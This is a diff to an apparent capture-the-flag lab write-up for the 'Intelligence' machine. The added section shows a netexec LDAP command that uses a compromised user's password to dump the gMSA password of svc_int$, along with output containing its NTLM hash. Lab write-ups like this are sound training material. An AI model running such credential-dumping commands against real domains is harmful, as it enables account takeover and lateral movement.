@@ -504,4 +504,12 @@ This user is compromised
 ![](Pasted%20image%2020260414171941.png)
 This user has ReadGMSAPassword on `svc_int$`
 
-# Compromis
+# Compromising `svc_int$`
+```python
+nxc ldap dc.intelligence.htb -u 'ted.graves' -p 'Mr.Teddy' --gmsa
+LDAP        10.129.95.154   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.95.154   389    DC               [+] intelligence.htb\ted.graves:Mr.Teddy 
+LDAP        10.129.95.154   389    DC               [*] Getting GMSA Passwords
+LDAP        10.129.95.154   389    DC               Account: svc_int$             NTLM: 3c356107d6b589fdfc215e2c3de484b5     PrincipalsAllowedToReadPassword: ['DC$', 'itsupport']
+```
+
